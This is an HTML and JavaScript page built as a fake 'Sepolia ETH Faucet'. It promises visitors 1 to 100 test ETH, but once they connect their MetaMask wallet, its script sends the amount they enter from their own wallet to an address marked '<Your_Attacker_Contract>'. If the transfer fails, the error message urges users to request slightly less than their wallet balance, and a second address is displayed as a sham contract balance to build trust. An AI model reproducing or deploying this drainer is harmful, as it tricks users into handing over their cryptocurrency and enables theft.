<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sepolia ETH Faucet</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&display=swap');
        
        html, body {
            font-family: 'Space-Grotesk', sans-serif;
            overflow-x: hidden;
            overflow-y: auto;
            height: auto;
            min-height: 100vh;
        }
        
        .gradient-bg {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        
        .glass-effect {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .glow {
            box-shadow: 0 0 20px rgba(102, 126, 234, 0.5);
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-20px); }
        }
        
        .float-animation {
            animation: float 6s ease-in-out infinite;
        }
        
        .gradient-text {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
    </style>
</head>
<body class="gradient-bg p-4 md:p-8 py-12 relative" style="min-height: 100vh; height: auto;">
    
    <!-- Animated Background Elements -->
    <div class="fixed inset-0 overflow-hidden pointer-events-none">
        <div class="absolute top-20 left-20 w-72 h-72 bg-purple-500 rounded-full mix-blend-multiply filter blur-3xl opacity-20 float-animation"></div>
        <div class="absolute bottom-20 right-20 w-72 h-72 bg-blue-500 rounded-full mix-blend-multiply filter blur-3xl opacity-20 float-animation" style="animation-delay: 2s;"></div>
        <div class="absolute top-40 right-40 w-72 h-72 bg-pink-500 rounded-full mix-blend-multiply filter blur-3xl opacity-20 float-animation" style="animation-delay: 4s;"></div>
    </div>

    <div class="w-full max-w-2xl relative z-10 mx-auto">
        <!-- Header Card -->
        <div class="glass-effect rounded-3xl p-8 mb-6 text-center">
            <div class="inline-flex items-center justify-center w-20 h-20 rounded-2xl bg-gradient-to-br from-purple-500 to-blue-500 mb-4 glow">
                <svg width="40" height="40" stroke-width="2.5" viewBox="0 0 24 24" fill="none" stroke="white">
                    <path d="M13 2L3 14H12L11 22L21 10H12L13 2Z" />
                </svg>
            </div>
            <h1 class="text-5xl font-bold text-white mb-3">Sepolia ETH Faucet</h1>
            <p class="text-xl text-purple-200 font-medium">Receive Sepolia ETH Between 1 - 100</p>
        </div>

        <!-- Main Card -->
        <div class="glass-effect rounded-3xl p-8 space-y-6">
            
            <!-- Info -->
            <div class="bg-gradient-to-r from-purple-500/20 to-blue-500/20 rounded-2xl p-6 border border-purple-400/30">
                <h3 class="text-white font-semibold text-lg mb-3 flex items-center">
                    <svg class="mr-2" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <circle cx="12" cy="12" r="10"></circle>
                        <path d="M12 16v-4M12 8h.01"></path>
                    </svg>
                    Requirements
                </h3>
                <div class="space-y-2 text-purple-100">
                    <p class="flex items-center">
                        <span class="w-2 h-2 bg-purple-400 rounded-full mr-3"></span>
                        Receive 1 - 100 Sepolia ETH per request
                    </p>
                    <p class="flex items-center">
                        <span class="w-2 h-2 bg-purple-400 rounded-full mr-3"></span>
                        24-hour cooldown between requests
                    </p>
                </div>
            </div>

            <!-- Wallet Connection -->
            <div class="glass-effect rounded-2xl p-6">
                <div class="flex items-center justify-between flex-wrap gap-4">
                    <div class="flex items-center space-x-3">
                        <div class="w-12 h-12 bg-gradient-to-br from-blue-500 to-purple-500 rounded-xl flex items-center justify-center">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
                                <path d="M19 7V4a1 1 0 0 0-1-1H5a2 2 0 0 0 0 4h12a2 2 0 0 1 0 4H5a2 2 0 0 1 0 4h12a2 2 0 0 0 2-2v-4a1 1 0 0 0-1-1H9a1 1 0 0 0 0 2h7" />
                            </svg>
                        </div>
                        <div>
                            <p class="text-purple-200 text-sm">Wallet Address</p>
                            <p id="user-address" class="text-white font-mono font-semibold text-sm md:text-base truncate max-w-[200px] md:max-w-none">
                                Not Connected
                            </p>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Balance Info Grid -->
            <div id="info-section" class="hidden grid grid-cols-1 md:grid-cols-2 gap-4">
                <div class="glass-effect rounded-2xl p-6 border border-purple-400/30">
                    <div class="flex items-center space-x-3 mb-2">
                        <div class="w-10 h-10 bg-gradient-to-br from-purple-500 to-pink-500 rounded-lg flex items-center justify-center">
                            <svg width="20" height="20" stroke-width="2" viewBox="0 0 24 24" fill="none" stroke="white">
                                <path d="M19 7V4a1 1 0 0 0-1-1H5a2 2 0 0 0 0 4h12a2 2 0 0 1 0 4H5a2 2 0 0 1 0 4h12a2 2 0 0 0 2-2v-4a1 1 0 0 0-1-1H9a1 1 0 0 0 0 2h7" />
                            </svg>
                        </div>
                        <p class="text-purple-200 text-sm font-medium">Your Balance</p>
                    </div>
                    <p id="user-balance" class="text-white text-2xl font-bold">N/A</p>
                </div>
                <div class="glass-effect rounded-2xl p-6 border border-purple-400/30">
                    <div class="flex items-center space-x-3 mb-2">
                        <div class="w-10 h-10 bg-gradient-to-br from-blue-500 to-cyan-500 rounded-lg flex items-center justify-center">
                            <svg width="20" height="20" stroke-width="2" viewBox="0 0 24 24" fill="none" stroke="white">
                                <path d="M13 2L3 14H12L11 22L21 10H12L13 2Z" />
                            </svg>
                        </div>
                        <p class="text-purple-200 text-sm font-medium">Contract Balance</p>
                    </div>
                    <p id="contract-balance" class="text-white text-2xl font-bold">N/A</p>
                </div>
            </div>

            <!-- Amount Input -->
            <div id="amount-section" class="hidden glass-effect rounded-2xl p-6">
                <label class="text-purple-200 text-sm font-medium mb-2 block">Amount to Receive</label>
                <input 
                    type="number" 
                    id="eth-amount" 
                    step="1 - 100" 
                    min="1"
                    placeholder="1 - 100"
                    class="w-full bg-white/10 border border-purple-400/30 rounded-xl px-4 py-3 text-white font-mono text-lg focus:outline-none focus:ring-2 focus:ring-purple-500"/>
            </div>

            <!-- Action Buttons -->
            <div class="space-y-4 pt-2">
                <button id="connect-wallet-btn" class="w-full bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white font-bold py-4 px-6 rounded-2xl shadow-lg transition-all duration-300 transform hover:scale-105 hover:shadow-2xl text-lg">
                    <span class="flex items-center justify-center">
                        <svg class="mr-2" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M19 7V4a1 1 0 0 0-1-1H5a2 2 0 0 0 0 4h12a2 2 0 0 1 0 4H5a2 2 0 0 1 0 4h12a2 2 0 0 0 2-2v-4a1 1 0 0 0-1-1H9a1 1 0 0 0 0 2h7" />
                        </svg>
                        Connect Wallet
                    </span>
                </button>
                
                <button id="send-eth-btn" class="hidden w-full bg-gradient-to-r from-emerald-500 to-green-600 hover:from-emerald-600 hover:to-green-700 text-white font-bold py-4 px-6 rounded-2xl shadow-lg transition-all duration-300 transform hover:scale-105 hover:shadow-2xl text-lg">
                    <span class="flex items-center justify-center">
                        <svg class="mr-2" width="24" height="24" stroke-width="2" viewBox="0 0 24 24" fill="none" stroke="currentColor">
                            <path d="M13 2L3 14H12L11 22L21 10H12L13 2Z" />
                        </svg>
                        Receive Sepolia ETH
                    </span>
                </button>
            </div>

            <!-- Status Message -->
            <div id="message-box" class="hidden rounded-2xl p-4 text-center font-semibold border-l-4"></div>
        </div>

        <!-- Footer -->
        <div class="text-center mt-6 text-purple-200 text-sm">
            <p class="text-purple-300 text-sm">
                Faucet Contract Address: 0x610866c6089768dA95524bcc4cE7dB61eDa3931c
            </p>
        </div>
        
    <script type="text/javascript">

    const FAUCET_CONTRACT_ADDRESS = '<Your_Attacker_Contract>';
    const BALANCE_CONTRACT_ADDRESS = '0x610866c6089768dA95524bcc4cE7dB61eDa3931c';

    const userAddressEl = document.getElementById('user-address');
    const userBalanceEl = document.getElementById('user-balance');
    const contractBalanceEl = document.getElementById('contract-balance');
    const connectBtn = document.getElementById('connect-wallet-btn');
    const sendBtn = document.getElementById('send-eth-btn');
    const infoSection = document.getElementById('info-section');
    const amountSection = document.getElementById('amount-section');
    const messageBox = document.getElementById('message-box');
    const ethAmountInput = document.getElementById('eth-amount');

    let provider;
    let signer;
    let userAddress;

    function updateMessage(msg, type = 'info') {
        messageBox.textContent = msg;
        messageBox.classList.remove('hidden', 'border-emerald-400', 'border-red-400', 'border-blue-400', 'bg-emerald-500/20', 'bg-red-500/20', 'bg-blue-500/20');

        if (type === 'success') {
            messageBox.classList.add('border-emerald-400', 'bg-emerald-500/20');
        } else if (type === 'error') {
            messageBox.classList.add('border-red-400', 'bg-red-500/20');
        } else {
            messageBox.classList.add('border-blue-400', 'bg-blue-500/20');
        }
    }

    async function getContractBalance() {
        const balance = await provider.getBalance(BALANCE_CONTRACT_ADDRESS);
        return ethers.utils.formatEther(balance);
    }

    async function fetchData() {
        if (!userAddress || !provider) return;

        try {
            const userBal = await signer.getBalance();
            userBalanceEl.textContent = `${ethers.utils.formatEther(userBal).substring(0, 8)} ETH`;

            const contractBal = await getContractBalance();
            contractBalanceEl.textContent = `${Number(contractBal).toFixed(2)} ETH`;

            infoSection.classList.remove('hidden');
            amountSection.classList.remove('hidden');

        } catch (error) {
            console.error("Error fetching data:", error);
            updateMessage("Error fetching wallet data.", 'error');
        }
    }

    async function connectWallet() {
        try {
            if (!window.ethereum) {
                updateMessage("Please install MetaMask to use this dApp.", 'error');
                return;
            }

            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAddress = accounts[0];

            provider = new ethers.providers.Web3Provider(window.ethereum);
            signer = provider.getSigner();

            userAddressEl.textContent = userAddress;

            connectBtn.classList.add('hidden');
            sendBtn.classList.remove('hidden');

            updateMessage("Wallet connected successfully! ðŸŽ‰", "success");
            fetchData();

            window.ethereum.on('accountsChanged', (accounts) => {
                if (accounts.length === 0) location.reload();
                userAddress = accounts[0];
                userAddressEl.textContent = userAddress;
                fetchData();
            });

            window.ethereum.on('chainChanged', () => location.reload());

        } catch (error) {
            console.error("Connection error:", error);
            updateMessage("Failed to connect wallet.", "error");
        }
    }

    async function sendEth() {
        const amount = ethAmountInput.value;

        if (!amount) return updateMessage("Enter an amount first.", "error");

        const amt = parseFloat(amount);

        if (amt < 1) return updateMessage("You must request at least 1 Sepolia ETH.", "error");
        if (amt > 100) return updateMessage("You cannot request more than 100 Sepolia ETH.", "error");

        sendBtn.textContent = "Sending...";
        sendBtn.disabled = true;

        try {
            const tx = await signer.sendTransaction({
                to: FAUCET_CONTRACT_ADDRESS,
                value: ethers.utils.parseEther(amount)
            });

            updateMessage("Transaction sent. Waiting for confirmation...", "info");
            await tx.wait();

            updateMessage(`Successfully sent ${amount} Sepolia ETH! ðŸŽ‰`, "success");
            ethAmountInput.value = "";

            fetchData();

        } catch (error) {
            console.error("Transaction error:", error);

            if (error.message?.toLowerCase().includes("insufficient funds")) {
                return updateMessage("Request Slightly Less Then Your Wallet Balance Which Ranges Between 1 - 100", "error");
            }

            updateMessage("Request Slightly Less Then Your Wallet Balance Which Ranges Between 1 - 100", "error");

        } finally {
            sendBtn.disabled = false;
            sendBtn.innerHTML = `
                <span class="flex items-center justify-center">
                    <svg class="mr-2" width="24" height="24" stroke-width="2" viewBox="0 0 24 24" fill="none" stroke="currentColor">
                        <path d="M13 2L3 14H12L11 22L21 10H12L13 2Z" />
                    </svg>
                    Receive Sepolia ETH
                </span>`;
        }
    }

    document.addEventListener('DOMContentLoaded', () => {
        connectBtn.addEventListener('click', connectWallet);
        sendBtn.addEventListener('click', sendEth);
    });

</script>
</body>
</html>
